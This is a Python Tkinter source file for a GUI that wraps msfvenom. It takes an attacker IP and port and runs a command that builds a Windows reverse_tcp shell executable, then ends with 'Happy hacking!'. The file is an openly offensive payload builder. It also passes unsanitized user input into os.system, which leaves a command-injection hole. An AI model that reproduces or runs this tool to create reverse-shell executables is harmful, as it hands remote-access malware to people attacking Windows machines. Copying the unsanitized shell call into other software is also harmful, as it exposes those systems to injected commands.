import os
import socket
from tkinter import font as tkfont
from tkinter.filedialog import asksaveasfilename

from nav_bar import *

localhost_IP = ''
detected_IP = ''
selected_port = ''


class MsfPayloadGen(tk.Frame):
    def __init__(self, parent, controller):
        tk.Frame.__init__(self, parent)
        self.controller = controller
        abtframefont = tkfont.Font(family='Calibri', size=33, weight="bold")
        display_nav_bar(self, controller)
        aboutframe = tk.Label(self, text="    MsfVenom Payload Generator Tool", bg='#3B5262', fg='white', anchor="c",
                              font=abtframefont)
        aboutframe.place(rely=0.08, relheight=0.12, relwidth=1)

        allscreenframe = tk.Label(self, bg='white')
        allscreenframe.place(rely=0.2, relheight=1, relwidth=1)

        labelIP = Label(self, text="Enter Attacker IP Address: ", font=('Calibri', 13), bg='#4D6C84', fg='white',
                        anchor='c')
        entryIP = Entry(self, font=('Calibri', 13))

        labelPort = Label(self, text="Enter Port Number: ", font=('Calibri', 13), bg='#4D6C84', fg='white', anchor='c')
        entryPort = Entry(self, font=('Calibri', 13))

        labelName = Label(self, text="Enter name for payload file: ", font=('Calibri', 13), bg='#4D6C84', fg='white',
                          anchor='c')
        entryName = Entry(self, font=('Calibri', 13), )

        labelIPRetrieve = Label(self, font=('Calibri', 13), anchor='c')
        yesButtonIP = Button(self, text="YES", font=('Calibri', 13), bg='#4D6C84', fg='white', anchor='c',
                             command=lambda: ip_retrieved())
        noButtonIP = Button(self, text="NO", font=('Calibri', 13), bg='#4D6C84', fg='white', anchor='c',
                            command=lambda: ip_manual())
        proceedButtonIP = Button(self, text="PROCEED", font=('Calibri', 13), bg='#4D6C84', fg='white', anchor='c',
                                 command=lambda: [remove_ip_entry_boxes(), set_port()])

        labelPortRetrieve = Label(self, text="Set default port (4444) for connection?", font=('Calibri', 13),
                                  bg='#4D6C84', fg='white', anchor='c')
        yesButtonPort = Button(self, text="YES", font=('Calibri', 13), anchor='c', bg='#4D6C84', fg='white',
                               command=lambda: port_default())
        noButtonPort = Button(self, text="NO", font=('Calibri', 13), bg='#4D6C84', fg='white', anchor='c',
                              command=lambda: port_manual())
        proceedButtonPort = Button(self, text="PROCEED", font=('Calibri', 13), bg='#4D6C84', fg='white', anchor='c',
                                   command=lambda: [remove_port_entry_boxes(), set_name()])

        labelGenerated = Label(self, font=('Calibri', 13), anchor='c')

        saveFileButton = Button(self, text="Save Payload As", font=('Calibri', 13), bg='#4D6C84', fg='white',
                                anchor='c', command=lambda: save_file())

        generateButton = Button(self, text="Generate Payload", font=('Calibri', 13), bg='#4D6C84', fg='white',
                                anchor='c', command=lambda: generate_payload())

        beginButton = Button(self, text="Lauch Tool", font=('Calibri', 18, 'bold'), bg='#4D6C84', fg='white',
                             anchor='c', command=lambda: set_IP())
        beginButton.place(rely=0.54, relx=0.44, relheight=0.08, relwidth=0.12)

        def save_file():
            global file
            file = asksaveasfilename(initialdir="/", defaultextension=".exe")
            saveFileButton.place_forget()
            generateButton.place(rely=0.54, relx=0.38, relheight=0.08, relwidth=0.24)

        def ip_entry_boxes():
            labelIP.place(rely=0.54, relx=0.18, relheight=0.08, relwidth=0.24)
            entryIP.place(rely=0.54, relx=0.44, relheight=0.08, relwidth=0.24)

        def port_entry_boxes():
            labelPort.place(rely=0.54, relx=0.18, relheight=0.08, relwidth=0.24)
            entryPort.place(rely=0.54, relx=0.44, relheight=0.08, relwidth=0.24)

        def remove_ip_entry_boxes():
            labelIP.place_forget()
            entryIP.place_forget()

        def remove_port_entry_boxes():
            labelPort.place_forget()
            entryPort.place_forget()

        def remove_name_entry_boxes():
            labelName.place_forget()
            entryName.place_forget()

        # Function to set IPv4 address of local machine.
        def set_IP():
            global localhost_IP
            global detected_IP

            try:
                beginButton.place_forget()
                labelGenerated.place_forget()
            finally:
                # Uses google DNS server to check IP.
                try:
                    p = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    p.connect(('8.8.8.8', 1))
                    detected_IP = p.getsockname()[0]
                    p.close()
                except:
                    detected_IP = '#IP UNRETRIEVABLE#'  # Try-except block prevents crash if IP cannot be retrieved.

                labelIPRetrieve.config(bg='#4D6C84', fg='white', text="Is this the correct IP address: " + detected_IP)
                labelIPRetrieve.place(rely=0.54, relx=0.24, relheight=0.08, relwidth=0.24)
                yesButtonIP.place(rely=0.54, relx=0.5, relheight=0.08, relwidth=0.12)
                noButtonIP.place(rely=0.54, relx=0.64, relheight=0.08, relwidth=0.12)

        def ip_retrieved():
            global localhost_IP
            global detected_IP

            labelIPRetrieve.place_forget()
            yesButtonIP.place_forget()
            noButtonIP.place_forget()
            localhost_IP = detected_IP
            set_port()

        def ip_manual():
            global localhost_IP
            localhost_IP = ''

            labelIPRetrieve.place_forget()
            yesButtonIP.place_forget()
            noButtonIP.place_forget()
            ip_entry_boxes()
            proceedButtonIP.place(rely=0.54, relx=0.7, relheight=0.08, relwidth=0.12)

        # Function to set correct port for attack.
        def set_port():
            try:
                proceedButtonIP.place_forget()
            finally:
                labelPortRetrieve.place(rely=0.54, relx=0.24, relheight=0.08, relwidth=0.24)
                yesButtonPort.place(rely=0.54, relx=0.5, relheight=0.08, relwidth=0.12)
                noButtonPort.place(rely=0.54, relx=0.64, relheight=0.08, relwidth=0.12)

        def port_default():
            global selected_port

            labelPortRetrieve.place_forget()
            yesButtonPort.place_forget()
            noButtonPort.place_forget()
            selected_port = '4444'
            set_name()

        def port_manual():
            global selected_port
            selected_port = ''

            labelPortRetrieve.place_forget()
            yesButtonPort.place_forget()
            noButtonPort.place_forget()
            port_entry_boxes()
            proceedButtonPort.place(rely=0.54, relx=0.7, relheight=0.08, relwidth=0.12)

        # Function to set name for executable file.
        def set_name():
            proceedButtonPort.place_forget()
            saveFileButton.place(rely=0.54, relx=0.38, relheight=0.08, relwidth=0.24)

        # Function to combine command which generates the executable.
        def generate_payload():
            global localhost_IP
            global selected_port

            try:
                proceedButtonPort.place_forget()
            finally:
                if (localhost_IP == ''):
                    localhost_IP = entryIP.get()
                if (selected_port == ''):
                    selected_port = entryPort.get()

            lhost = localhost_IP
            lport = selected_port

            s1 = 'msfvenom -p windows/shell/reverse_tcp lhost='
            s2 = ' lport='
            s3 = " -f exe > " + file

            command = (s1 + lhost + s2 + lport + s3)
            os.system(command)

            if (os.path.isfile(file)):
                try:
                    labelGenerated.place_forget()
                    remove_name_entry_boxes()
                    generateButton.place_forget()
                    saveFileButton.place_forget()
                finally:
                    labelGenerated.config(
                        text="Done! Payload should appear in 'root' folder of this machine. Happy hacking!")
                    labelGenerated.place(rely=0.46, relx=0.23, relheight=0.08, relwidth=0.54)
                    beginButton.place(rely=0.56, relx=0.44, relheight=0.08, relwidth=0.12)
            else:
                try:
                    labelGenerated.place_forget()
                    remove_name_entry_boxes()
                    generateButton.place_forget()
                    saveFileButton.place_forget()
                finally:
                    labelGenerated.config(text="Payload generation unsuccessful, please try again.")
                    labelGenerated.place(rely=0.46, relx=0.23, relheight=0.08, relwidth=0.54)
                    beginButton.place(rely=0.56, relx=0.44, relheight=0.08, relwidth=0.12)

# REFERENCES:

# https://stackoverflow.com/questions/166506/finding-local-ip-addresses-using-pythons-stdlib
# Used to help define 'set_IP()' function.
